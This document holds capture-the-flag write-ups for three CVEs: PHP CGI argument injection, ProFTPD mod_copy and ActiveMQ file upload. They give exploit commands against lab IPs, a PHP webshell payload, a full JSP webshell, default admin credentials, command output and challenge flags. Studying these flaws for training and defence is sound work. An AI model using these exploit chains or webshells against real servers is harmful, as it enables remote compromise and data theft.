# Sample CVE Writeups

---

# CVE-2012-1823 - PHP CGI - Information Leakage

## Overview

* Vulnerability: CVE-2012-1823
* Affected Service: PHP CGI
* Impact: Information Disclosure / Remote Code Execution
* Discovery: Found by Eindbazen during a Capture The Flag (CTF) competition

This vulnerability occurs because the PHP CGI module improperly handles arguments passed through the URI.

Attackers can inject PHP CGI options directly from the URL, allowing them to:

* Display PHP source code
* Leak sensitive information
* Potentially achieve Remote Code Execution

The `-s` option is especially dangerous because it displays syntax-highlighted source code.

---

## Understanding the Vulnerability

Example PHP CGI help output:

```bash
php-cgi -h
```

```text
Usage: php [-q] [-h] [-s] [-v] [-i] [-f ]

 -s   Display colour syntax highlighted source.
```

The vulnerable CGI handler incorrectly accepts these options from the URL.

---

## Challenge Information

* Vulnerability: CVE-2012-1823
* Goal: Read the source code and retrieve the flag

---

## Exploitation

Append the `-s` option directly to the PHP file request:

```bash
curl "http://34.143.176.29/index.php?-s"
```

The server responds with the syntax-highlighted PHP source code.

Within the source code, the flag is revealed:

```text
cve{GlCinQUQmd}
```

---

## Flag

```text
cve{GlCinQUQmd}
```

---

## Key Learning Points

* Understand how PHP CGI processes arguments
* Learn why passing CGI options through the URI is dangerous
* Use the `-s` option to disclose PHP source code
* Identify sensitive information leakage through exposed source

---

# CVE-2015-3306 - ProFTPD - Remote Code Execution

## Overview

* Vulnerability: CVE-2015-3306
* Affected Service: ProFTPD 1.3.4 - 1.3.5
* Impact: Remote Code Execution
* Vulnerable Module: `mod_copy`

The `mod_copy` module allows attackers to copy files on the target system using:

* `SITE CPFR` → select source file
* `SITE CPTO` → select destination file

If the FTP service has sufficient privileges and the web root is writable, attackers can write a malicious PHP file into the web server directory and achieve Remote Code Execution.

---

## Challenge Information

* Vulnerability: CVE-2015-3306
* Service: ProFTPD 1.3.4 - 1.3.5
* Ports Open: 20, 21, 80, 4444, 4445
* Goal: Read `/tmp/flag.txt`

---

## Enumeration

Verify the FTP service:

```bash
nc 34.177.100.151 21
```

The server responds with a ProFTPD banner.

---

## Exploitation

The exploitation chain is:

1. Use `/proc/self/cmdline` as the source file
2. Inject PHP code into the command line
3. Copy the payload into the web root
4. Execute commands through the PHP webshell

---

### Step 1 — Connect to FTP

```bash
nc 34.177.100.151 21
```

---

### Step 2 — Create the PHP Payload

Send the following commands:

```text
SITE CPFR /proc/self/cmdline
SITE CPTO /tmp/.<?php passthru($_GET['cmd']); ?>
SITE CPFR /tmp/.<?php passthru($_GET['cmd']); ?>
SITE CPTO /var/www/html/shell.php
```

### Explanation

* `/proc/self/cmdline` contains the current ProFTPD command line
* The payload is injected into the command line
* The payload is first written into `/tmp/`
* The payload is then copied into the web root as `shell.php`

---

## Getting Remote Code Execution

Test command execution:

```bash
curl "http://34.177.100.151/shell.php?cmd=id"
```

Example output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirms Remote Code Execution.

---

## Reading the Flag

List files in `/tmp`:

```bash
curl -s "http://34.177.100.151/shell.php?cmd=ls%20-la%20/tmp" | sed 's/%/\n/g'
```

Discovered flag file:

```text
/tmp/flag_MmY2M.txt
```

Read the flag:

```bash
curl -s "http://34.177.100.151/shell.php?cmd=cat%20/tmp/flag_MmY2M.txt" | strings
```

Output:

```text
cve{fnC0h4Y8yy}
```

---

## Flag

```text
cve{fnC0h4Y8yy}
```

---

## Key Learning Points

* Understand how `mod_copy` works in ProFTPD
* Abuse `SITE CPFR` and `SITE CPTO`
* Use `/proc/self/cmdline` for payload injection
* Write a PHP webshell into the web root
* Achieve Remote Code Execution through the web server
* Enumerate the filesystem to retrieve sensitive files

---

# CVE-2016-3088 - ActiveMQ - Remote Code Execution

## Overview

* Vulnerability: CVE-2016-3088
* Affected Service: Apache ActiveMQ 5.12.x - 5.13.x
* Impact: Arbitrary File Upload / Remote Code Execution

Apache ActiveMQ commonly exposes three web applications:

1. Admin → administrative interface
2. API → messaging API
3. FileServer → file upload/download service

The vulnerability allows attackers to abuse the FileServer functionality to upload arbitrary files onto the server.

If attackers can place a malicious JSP file into an executable web directory, they can achieve Remote Code Execution.

---

## Challenge Information

* Vulnerability: CVE-2016-3088
* Service: Apache ActiveMQ
* Ports Open: 8161, 61616
* Goal: Read `/tmp/flag_xxxx.txt`

Target:

```text
34.143.179.92
```

---

## Enumeration

Verify the ActiveMQ web console:

```bash
curl -i http://34.143.179.92:8161
```

The server responds with an Apache ActiveMQ interface.

---

## Authentication

The admin panel uses HTTP Basic Authentication.

Default credentials worked:

```text
admin:admin
```

---

## Exploitation

The exploitation chain is:

1. Upload a JSP webshell
2. Place it into the executable admin web application
3. Execute operating system commands
4. Read the flag file

---

## Step 1 — Create JSP Webshell

Create `shell.jsp`:

```jsp
<%
if(request.getParameter("cmd") != null){
    String cmd = request.getParameter("cmd");

    String[] command = {"/bin/sh", "-c", cmd};

    Process p = Runtime.getRuntime().exec(command);

    java.io.InputStream in = p.getInputStream();

    int a = -1;
    while((a=in.read())!=-1){
        out.print((char)a);
    }
}
%>
```

---

## Step 2 — Upload the Webshell

Upload the payload through the vulnerable FileServer functionality:

```bash
curl -u admin:admin \
-X PUT \
--data-binary @shell.jsp \
http://34.143.179.92:8161/fileserver/shell.jsp
```

---

## Step 3 — Execute Commands

Access the uploaded JSP shell:

```bash
curl -u admin:admin \
"http://34.143.179.92:8161/admin/shell.jsp?cmd=id"
```

Example output:

```text
uid=1000(activemq) gid=1000(activemq)
```

This confirms Remote Code Execution.

---

## Reading the Flag

List files inside `/tmp`:

```bash
curl -u admin:admin \
"http://34.143.179.92:8161/admin/shell.jsp?cmd=ls%20/tmp"
```

Discovered flag file:

```text
/tmp/flag_MzdlM.txt
```

Read the flag:

```bash
curl -u admin:admin \
"http://34.143.179.92:8161/admin/shell.jsp?cmd=cat%20/tmp/flag_MzdlM.txt"
```

Output:

```text
cve{r7FHd9pAl9}
```

---

## Flag

```text
cve{r7FHd9pAl9}
```

---

## Key Learning Points

* Understand Apache ActiveMQ architecture
* Abuse the FileServer component for arbitrary file upload
* Use JSP webshells for Java-based web applications
* Achieve Remote Code Execution through uploaded server-side scripts
* Enumerate Linux directories for sensitive files
* Chain authentication + arbitrary upload into full compromise
